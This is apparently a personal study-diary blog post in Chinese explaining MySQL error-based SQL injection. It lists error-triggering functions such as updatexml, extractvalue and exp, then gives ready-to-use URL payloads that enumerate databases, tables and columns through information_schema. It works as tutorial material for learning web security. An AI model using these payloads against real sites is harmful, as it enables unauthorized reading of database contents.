title: SQL报错注入
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-03-12 11:37:00
---
#### 表现
数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’

#### 原理
在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！

#### 思路
报错注入嘛，首先肯定要让它报错呀。
那么什么时候才会报错呢？
```
Xpath语法错误
     extractvalue(1,(concat(0x7e,(payload),0x7e)))
     updatexml(1,(concat(0x7e,(payload),0x7e)))
     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错
     详细的使用方法请自行查找
数据溢出错误
     exp(x)
     当参数x超过710时，exp()函数会报错
主键重复错误
     floor(x)：
     count()和group by遇到rand()产生的重复值时报错
函数特性报错
     使用name_const来制造一个列
     mysql列名重复会报错
参数类型报错(不写了，自己找去)
```
现在有了报错，怎么利用？
忘记了那个and和or语句了吗？
把SQL语句放到产生报错的语句中，
再将原本要传入的参数和上面已经结合起来的语句用and合为payload。

#### 开始注入
##### 判断是否存在注入
```
?id=1' -- a
```
老一套了，直接拿来用。

##### 判断是否是报错注入
```
?id=1' and updatexml(1,'~',3) -- a
```
如果报错了那说明是的，这里可以多换几个函数。
要让前面一半正常执行！

##### 爆库
```
?id=-1' and updatexml(1,concat('~',
	substr( 
		(select group_concat(schema_name)
		from information_schema.schemata)
	, 1 , 31)
),3) -- a
```
一样的，函数自己换
但是注意高版本数据库基本上都没有这个漏洞了
尽管这样，一旦有漏洞就能用这个库跑了

##### 爆表
```
?id=1' and updatexml(1,concat('~',
	substr( 
		(select group_concat(table_name)
		from information_schema.tables
		where table_schema = '库名')
	, 1 , 31)
),3) -- a
```

##### 爆字段
```
?id=1' and updatexml(1,concat('~',
	substr( 
		(select group_concat(column_name)
		from information_schema.columns
		where table_schema = '库名' and table_name = '表名')
	, 1 , 31)
),3) -- a
```
